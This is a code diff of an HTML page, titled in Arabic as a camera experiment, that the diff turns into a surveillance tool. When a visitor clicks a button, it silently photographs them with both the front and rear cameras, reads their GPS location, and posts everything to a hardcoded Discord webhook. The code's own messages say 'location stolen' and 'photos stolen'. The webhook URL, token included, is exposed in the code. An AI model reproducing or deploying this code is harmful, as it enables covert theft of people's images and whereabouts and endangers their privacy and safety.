@@ -1,48 +1,37 @@
 <html>
   <body>
-    <h1>تجربة تصوير كاميرا وإرسالها ويب هوك</h1>
+    <h1>تجربة تصوير كاميرا أمامية وخلفية + GPS</h1>
     <button id="start">ابدأ التصوير والإرسال</button>
     <video id="video" autoplay style="display:none;"></video>
 
     <script>
       const webhookURL = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";
 
-      document.getElementById('start').onclick = () => {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+      async function captureImage(facingMode) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+          const video = document.getElementById('video');
+          video.srcObject = stream;
 
-            // بعد 3 ثواني نصور صورة من الفيديو ونرسلها
-            setTimeout(() => {
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-              // صورة بصيغة Base64
-              const imageData = canvas.toDataURL('image/png');
-
-              // نرسل الصورة على ويب هوك كملف مرفق
-              const formData = new FormData();
-              formData.append('file', dataURItoBlob(imageData), 'snapshot.png');
-
-              fetch(webhookURL, {
-                method: 'POST',
-                body: formData
-              });
-
-              // نوقف الكاميرا بعد التصوير
-              stream.getTracks().forEach(track => track.stop());
-            }, 3000);
-          })
-          .catch(err => {
-            alert('رفضت الإذن أو صار خطأ');
+          await new Promise(resolve => {
+            video.onloadedmetadata = () => resolve();
           });
-      };
 
-      // دالة تحول Base64 الى Blob عشان نرسلها كملف
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // نوقف الكاميرا بعد التصوير
+          stream.getTracks().forEach(track => track.stop());
+
+          return canvas.toDataURL('image/png');
+        } catch (e) {
+          return null;
+        }
+      }
+
       function dataURItoBlob(dataURI) {
         const byteString = atob(dataURI.split(',')[1]);
         const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
@@ -52,6 +41,40 @@
           ia[i] = byteString.charCodeAt(i);
         }
         return new Blob([ab], { type: mimeString });
+      }
+
+      document.getElementById('start').onclick = async () => {
+        // نصور الكاميرا الأمامية
+        const frontImage = await captureImage('user');
+        // نصور الكاميرا الخلفية
+        const backImage = await captureImage('environment');
+
+        // نجيب الموقع
+        navigator.geolocation.getCurrentPosition(position => {
+          // نبني فورم داتا نرسلها للويب هوك
+          const formData = new FormData();
+          formData.append('content', `تم سرقة الموقع: \nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`);
+
+          if (frontImage) formData.append('file', dataURItoBlob(frontImage), 'front.png');
+          if (backImage) formData.append('file', dataURItoBlob(backImage), 'back.png');
+
+          fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+          });
+        }, err => {
+          // لو رفض الموقع نرسل بدون الموقع
+          const formData = new FormData();
+          formData.append('content', 'تم سرقة الصور ولكن الموقع مرفوض');
+
+          if (frontImage) formData.append('file', dataURItoBlob(frontImage), 'front.png');
+          if (backImage) formData.append('file', dataURItoBlob(backImage), 'back.png');
+
+          fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+          });
+        });
       }
     </script>
   </body>
